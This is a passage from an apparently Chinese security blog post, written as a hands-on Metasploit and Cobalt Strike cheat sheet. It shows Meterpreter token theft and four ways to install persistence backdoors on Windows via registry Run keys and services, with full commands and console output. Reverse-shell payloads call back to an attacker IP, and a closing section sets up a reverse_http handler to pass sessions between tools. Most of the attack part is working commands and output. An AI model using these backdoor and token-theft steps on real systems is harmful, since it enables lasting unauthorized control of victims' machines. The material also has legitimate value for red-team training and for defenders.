2.steal_token窃取令牌</span><br>steal_token &lt;pid值&gt;   <span class="hljs-comment">#从指定进程中窃取token   先ps,找域控进程</span><br>drop_token  <span class="hljs-comment">#删除窃取的token</span><br></code></pre></td></tr></table></figure>

<h3 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p>
<p>1.persistence启动项后门</p>
<p>路径：metasploit&#x2F;scripts&#x2F;meterpreter&#x2F;persistence</p>
<p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">run persistence –h  <span class="hljs-comment">#查看帮助</span><br>run persistence -X -i 5 -p 4444 -r 192.168.81.160<br><span class="hljs-comment">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="hljs-comment"># 示例</span><br>meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160<br><br>[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.<br>[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]<br>[*] Running Persistence Script<br>[*] Resource file <span class="hljs-keyword">for</span> cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc<br>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444<br>[*] Persistent agent script is 99630 bytes long<br>[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs<br>[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs<br>[+] Agent executed with PID 3540<br>[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua<br>[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua<br></code></pre></td></tr></table></figure>

<p>能实现同样功能的脚本还有：exploit&#x2F;windows&#x2F;local&#x2F;persistence</p>
<p>2.metsvc服务后门</p>
<p>在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">run metsvc –A   <span class="hljs-comment">#自动安装后门</span><br><br><span class="hljs-comment"># 示例</span><br>meterpreter &gt; run metsvc –A<br><br>[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.<br>[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]<br>[*] Creating a meterpreter service on port 31337<br>[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...<br>[*]  &gt;&gt; Uploading metsrv.x86.dll...<br>[*]  &gt;&gt; Uploading metsvc-server.exe...<br>[*]  &gt;&gt; Uploading metsvc.exe...<br>[*] Starting the service...<br>    Cannot open service manager (0x00000005)<br><br>meterpreter &gt; <span class="hljs-built_in">ls</span><br>Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH<br>========================================================<br><br>Mode              Size    Type  Last modified              Name<br>----              ----    ----  -------------              ----<br>100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll<br>100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe<br>100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe<br></code></pre></td></tr></table></figure>

<p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p>
<p>3.persistence_exe</p>
<p>再来看看官方推荐的东西吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; info post/windows/manage/persistence_exe<br><br>       Name: Windows Manage Persistent EXE Payload Installer<br>     Module: post/windows/manage/persistence_exe<br>   Platform: Windows<br>       Arch: <br>       Rank: Normal<br><br>Provided by:<br>  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;<br><br>Compatible session types:<br>  Meterpreter<br><br>Basic options:<br>  Name      Current Setting  Required  Description<br>  ----      ---------------  --------  -----------<br>  REXENAME  default.exe      <span class="hljs-built_in">yes</span>       The name to call exe on remote system<br>  REXEPATH                   <span class="hljs-built_in">yes</span>       The remote executable to upload and execute.<br>  SESSION                    <span class="hljs-built_in">yes</span>       The session to run this module on.<br>  STARTUP   USER             <span class="hljs-built_in">yes</span>       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM, SERVICE)<br><br>Description:<br>  This Module will upload an executable to a remote host and make it <br>  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER <br>  will start on user login, SYSTEM will start on system boot but <br>  requires privs. SERVICE will create a new service <span class="hljs-built_in">which</span> will start <br>  the payload. Again requires privs.<br><br><br><br>Module options (post/windows/manage/persistence_exe):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   REXENAME  default.exe      <span class="hljs-built_in">yes</span>       The name to call exe on remote system<br>   REXEPATH                   <span class="hljs-built_in">yes</span>       The remote executable to upload and execute.<br>   SESSION                    <span class="hljs-built_in">yes</span>       The session to run this module on.<br>   STARTUP   USER             <span class="hljs-built_in">yes</span>       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM, SERVICE)<br></code></pre></td></tr></table></figure>

<p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p>
<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
<p>尝试一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER<br><br>[*] Running module against SAUCERMAN<br>[*] Reading Payload from file /home/ubuntu/shell.exe<br>[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe<br>[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe<br>[+] Agent executed with PID 3684<br>[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI<br>[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI<br>[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc<br></code></pre></td></tr></table></figure>

<p>4.registry_persistence</p>
<p>完整路径为exploit&#x2F;windows&#x2F;local&#x2F;registry_persistence</p>
<p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background<br>[*] Backgrounding session 13...<br>msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence<br>msf5 exploit(windows/local/registry_persistence) &gt; show options<br><br>Module options (exploit/windows/local/registry_persistence):<br><br>   Name           Current Setting  Required  Description<br>   ----           ---------------  --------  -----------<br>   BLOB_REG_KEY                    no        The registry key to use <span class="hljs-keyword">for</span> storing the payload blob. (Default: random)<br>   BLOB_REG_NAME                   no        The name to use <span class="hljs-keyword">for</span> storing the payload blob. (Default: random)<br>   CREATE_RC      <span class="hljs-literal">true</span>             no        Create a resource file <span class="hljs-keyword">for</span> cleanup<br>   RUN_NAME                        no        The name to use <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;Run&#x27;</span> key. (Default: random)<br>   SESSION                         <span class="hljs-built_in">yes</span>       The session to run this module on.<br>   SLEEP_TIME     0                no        Amount of time to <span class="hljs-built_in">sleep</span> (<span class="hljs-keyword">in</span> seconds) before executing payload. (Default: 0)<br>   STARTUP        USER             <span class="hljs-built_in">yes</span>       Startup <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> the persistent payload. (Accepted: USER, SYSTEM)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf5 exploit(windows/local/registry_persistence) &gt; <span class="hljs-built_in">set</span> SESSION 13<br>SESSION =&gt; 13<br>msf5 exploit(windows/local/registry_persistence) &gt; run<br><br>[*] Generating payload blob..<br>[+] Generated payload, 6048 bytes<br>[*] Root path is HKCU<br>[*] Installing payload blob..<br>[+] Created registry key HKCU\Software\0BaG3zDR<br>[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD<br>[*] Installing run key<br>[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB<br>[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc<br></code></pre></td></tr></table></figure>

<p>同类型的还有其他payload，如exploit&#x2F;windows&#x2F;local&#x2F;vss_persistence，exploit&#x2F;windows&#x2F;local&#x2F;s4u_persistence。</p>
<h1 id="cs大全"><a href="#cs大全" class="headerlink" title="cs大全"></a>cs大全</h1><p>cs派生msf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use exploit/multi/handler <br>msf exploit(handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br>msf exploit(handler) &gt; <span class="hljs-built_in">set</span> lhost 192.168.0.143<br>msf exploit(handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>msf exploit(handler) &gt; exploit<br><br>cs创建一个windows/foreign/reverse_http的 Listener<br>然后选中对应机器，右键-&gt;Spawn，选择刚刚创建的监听器。<br></code></pre></td></tr></table></figure>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/10/SQLi-lab%E6%B5%8B%E8%AF%95/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SQLi_lab测试</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/04/10/%E5%88%9D%E9%83%A8%E7%BD%B2hexo/">
                        <span class="hidden-mobile">初部署hexo</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
